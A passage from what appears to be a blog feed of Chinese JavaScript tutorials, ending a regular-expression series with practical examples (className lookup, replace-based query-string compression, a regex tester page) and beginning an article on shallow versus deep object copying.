punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "3"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">.</span>leftContext <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">[</span><span class="token string">"$`"</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "a1b2"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">.</span>rightContext <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> RegExp<span class="token punctuation">[</span><span class="token string">"$'"</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "d4e5"复制代码</span></code></pre><h3 id="3-真实案例"><a href="#3-真实案例" class="headerlink" title="3. 真实案例"></a>3. 真实案例</h3><p><strong>3.1 使用构造函数生成正则表达式</strong></p><p>我们知道要优先使用字面量来创建正则，但有时正则表达式的主体是不确定的，此时可以使用构造函数来创建。模拟<code>getElementsByClassName</code>方法，就是很能说明该问题的一个例子。</p><p>这里<code>getElementsByClassName</code>函数的实现思路是：</p><ul><li>比如要获取className为”high”的dom元素；</li><li>首先生成一个正则：<code>/(^|\s)high(\s|$)/</code>；</li><li>然后再用其逐一验证页面上的所有dom元素的类名，拿到满足匹配的元素即可。</li></ul><p>代码如下(可以直接复制到本地查看运行效果)：</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"high"</span><span class="token operator">></span><span class="token number">1111</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"high"</span><span class="token operator">></span><span class="token number">2222</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token number">3333</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">function</span> <span class="token function">getElementsByClassName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> elements <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">"(^|\\s)"</span> <span class="token operator">+</span> className <span class="token operator">+</span> <span class="token string">"(\\s|$)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> elements<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> element <span class="token operator">=</span> elements<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>element<span class="token punctuation">.</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> highs <span class="token operator">=</span> <span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">'high'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highs<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span>    item<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">'red'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>复制代码</code></pre><p><strong>3.2 使用字符串保存数据</strong></p><p>一般情况下，我们都愿意使用数组来保存数据。但我看到有的框架中，使用的却是字符串。</p><p>使用时，仍需要把字符串切分成数组。虽然不一定用到正则，但总感觉酷酷的，这里分享如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token string">"Boolean|Number|String|Function|Array|Date|RegExp|Object|Error"</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span>    utils<span class="token punctuation">[</span><span class="token string">"is"</span> <span class="token operator">+</span> item<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>toString<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"[object "</span> <span class="token operator">+</span> item <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> utils<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><p><strong>3.3 if语句中使用正则替代&amp;&amp;</strong></p><p>比如，模拟<code>ready</code>函数，即加载完毕后再执行回调（不兼容ie的）：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> readyRE <span class="token operator">=</span> <span class="token regex">/complete|loaded|interactive/</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">ready</span><span class="token punctuation">(</span>callback<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>readyRE<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>body<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>            <span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span>             <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token boolean">false</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"加载完毕！"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>复制代码</code></pre><p><strong>3.4 使用强大的replace</strong></p><p>因为<code>replace</code>方法比较强大，有时用它根本不是为了替换，只是拿其匹配到的信息来做文章。</p><p>这里以查询字符串（querystring）压缩技术为例，注意下面<code>replace</code>方法中，回调函数根本没有返回任何东西。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">compress</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> keys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    source<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/([^=&amp;]+)=([^&amp;]*)/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>full<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        keys<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>keys<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">?</span> keys<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">','</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">+</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> keys<span class="token punctuation">)</span> <span class="token punctuation">{</span>        result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">'='</span> <span class="token operator">+</span> keys<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">compress</span><span class="token punctuation">(</span><span class="token string">"a=1&amp;b=2&amp;a=3&amp;b=4"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "a=1,3&amp;b=2,4"</span>复制代码</code></pre><p><strong>3.5 综合运用</strong></p><p>最后这里再做个简单实用的正则测试器。</p><p>具体效果如下：<img src="https://user-gold-cdn.xitu.io/2017/9/30/d3c3b86f36bf9d9b98509f1c7a7a921a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p><img src="https://user-gold-cdn.xitu.io/2017/7/12/f56c1319ec49ee892bb73819e9ddefd9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>代码，直接贴了，相信你能看得懂：</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>section<span class="token operator">></span>    <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"err"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">"regex"</span> placeholder<span class="token operator">=</span><span class="token string">"请输入正则表达式"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">"text"</span> placeholder<span class="token operator">=</span><span class="token string">"请输入测试文本"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>button id<span class="token operator">=</span><span class="token string">"run"</span><span class="token operator">></span>测试一下<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>    <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"result"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>section<span class="token operator">></span><span class="token operator">&lt;</span>style<span class="token operator">></span>section<span class="token punctuation">{</span>    display<span class="token punctuation">:</span>flex<span class="token punctuation">;</span>    flex<span class="token operator">-</span>direction<span class="token punctuation">:</span>column<span class="token punctuation">;</span>    justify<span class="token operator">-</span>content<span class="token punctuation">:</span>space<span class="token operator">-</span>around<span class="token punctuation">;</span>    height<span class="token punctuation">:</span>300px<span class="token punctuation">;</span>    padding<span class="token punctuation">:</span><span class="token number">0</span> 200px<span class="token punctuation">;</span><span class="token punctuation">}</span>section <span class="token operator">*</span><span class="token punctuation">{</span>    min<span class="token operator">-</span>height<span class="token punctuation">:</span>30px<span class="token punctuation">;</span><span class="token punctuation">}</span>#err <span class="token punctuation">{</span>    color<span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token punctuation">}</span>#result<span class="token punctuation">{</span>    line<span class="token operator">-</span>height<span class="token punctuation">:</span>30px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span>info <span class="token punctuation">{</span>    background<span class="token punctuation">:</span>#00c5ff<span class="token punctuation">;</span>    padding<span class="token punctuation">:</span>2px<span class="token punctuation">;</span>    margin<span class="token punctuation">:</span>2px<span class="token punctuation">;</span>    display<span class="token punctuation">:</span>inline<span class="token operator">-</span>block<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 获取相应dom元素</span>    <span class="token keyword">var</span> regexInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"regex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> textInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> runBtn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"run"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> errBox <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"err"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> resultBox <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 绑定点击事件</span>    runBtn<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 清除错误和结果</span>        errBox<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        resultBox<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取正则和文本</span>        <span class="token keyword">var</span> text <span class="token operator">=</span> textInput<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">var</span> regex <span class="token operator">=</span> regexInput<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>regex <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            errBox<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"请输入正则表达式"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>text <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            errBox<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"请输入测试文本"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            regex <span class="token operator">=</span> <span class="token function">createRegex</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>regex<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> result<span class="token punctuation">,</span> results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 没有修饰符g的话，会死循环</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>regex<span class="token punctuation">.</span>global<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">while</span><span class="token punctuation">(</span>result <span class="token operator">=</span> regex<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    results<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                results<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>regex<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                resultBox<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"匹配到0个结果"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 倒序是有必要的</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> results<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">var</span> result <span class="token operator">=</span> results<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> match <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> prefix <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> suffix <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>index <span class="token operator">+</span> match<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                text <span class="token operator">=</span> prefix                     <span class="token operator">+</span> <span class="token string">'&lt;span class="info">'</span>                    <span class="token operator">+</span> match                    <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span>                    <span class="token operator">+</span> suffix<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            resultBox<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"匹配到"</span> <span class="token operator">+</span> results<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token string">"个结果:&lt;br>"</span> <span class="token operator">+</span> text<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 生成正则表达式，核心函数</span>    <span class="token keyword">function</span> <span class="token function">createRegex</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>regex<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                regex <span class="token operator">=</span> regex<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                regex<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> flags <span class="token operator">=</span> regex<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                regex <span class="token operator">=</span> regex<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                regex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>regex<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                regex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>regex<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> regex<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            errBox<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"无效的正则表达式"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>复制代码</code></pre><h3 id="第七章小结"><a href="#第七章小结" class="headerlink" title="第七章小结"></a>第七章小结</h3><p>相关API的注意点，本章基本上算是一网打尽了。</p><p>至于文中的例子，都是点睛之笔，没有详细解析。如有理解不透的，建议自己敲一敲。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>其实本文首发于：<a href="https://link.juejin.im/?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F27653434" target="_blank" rel="noopener">正则表达式系列总结 - 知乎专栏</a></p><p>原文是一个系列。一直等到老姚成为掘金的专栏作者，经过仔细考虑，在掘金平台没有采用系列形式，而是合成为了一篇文章。这样既便于读者阅读，最起码能一气呵成地阅读。同时也便于作者统一回复留言。</p><p>文章要结束了，最后还要有几点说明。</p><h3 id="1-需要注意的地方"><a href="#1-需要注意的地方" class="headerlink" title="1. 需要注意的地方"></a>1. 需要注意的地方</h3><p>本文主要讨论的是JavaScript的正则表达式，更精确地说是ES5的正则表达式。</p><p>JavaScript的正则表达式引擎是传统型NFA的，因此本系列的讨论是适合任何一门正则引擎是传统型NFA的编程语言。当然，市面上大部分语言的正则引擎都是这种的。而JS里正则涉及到的所有语法要点，是这种引擎支持的核心子集。也就是说，要学正则表达式，不妨以JS正则为出发点。</p>]]></content>
      
      
      <categories>
          
          <category> 正则表达式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅拷贝与深拷贝</title>
      <link href="2018/09/27/JavaScript-%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/"/>
      <url>2018/09/27/JavaScript-%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/</url>
      
        <content type="html"><![CDATA[<ul><li>对象间赋值</li><li>浅拷贝</li><li>深拷贝</li><li>Object.assign</li><li>JSON.stringify</li><li>递归实现深拷贝</li></ul><h2 id="对象间赋值"><a href="#对象间赋值" class="headerlink" title="对象间赋值"></a>对象间赋值</h2><p>除了一些基本类型，对象之间的赋值，只是将地址指向同一个，而不是真正意义上的拷贝</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>b<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// b中添加了一个4</span><span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// a变成了[1,2,3,4] </span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>a<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">var</span> obj2 <span class="token operator">=</span> obj<span class="token punctuation">;</span>obj2<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// obj2.a改变了，</span><span class="token function">alert</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 20，obj的a跟着改变 </span></code></pre><h2 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h2><p>所以为了解决地址指向同一个的问题，我们需要封装一个函数，来对对象进行拷贝，通过for in 循环获取基本类型，赋值每一个基本类型，才能真正意义上的复制一个对象</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>a<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> newobj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token keyword">var</span> attr <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>        newobj<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> newobj<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token function">copy</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>obj2<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//10  </span></code></pre><p>这样就解决了对象赋值的问题。</p><blockquote><p>浅拷贝是会将对象的每个属性进行依次复制，但是当对象的属性值是引用类型时，实质复制的是其引用，当引用指向的值改变时也会跟着变化。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>a<span class="token punctuation">:</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> newobj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token keyword">var</span> attr <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>        newobj<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> newobj<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span 